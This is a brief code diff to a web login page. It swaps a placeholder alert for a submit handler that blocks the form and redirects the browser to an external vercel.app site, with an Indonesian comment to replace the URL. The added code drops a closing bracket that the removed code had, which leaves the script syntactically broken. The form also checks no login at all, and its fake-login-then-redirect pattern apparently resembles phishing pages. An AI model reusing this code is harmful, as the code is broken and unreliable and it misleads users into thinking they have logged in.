@@ -250,12 +250,12 @@
             }, 2000);
             
             // Form submission
-            const form = document.querySelector('form');
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                alert('Login functionality would be implemented here');
-            });
-        });
+const form = document.querySelector('form');
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    // Alihkan ke halaman kedua setelah login
+    window.location.href = 'https://doxczap.vercel.app/'; // Ganti dengan URL halaman kedua Anda
+});
     </script>
 </body>
 </html>
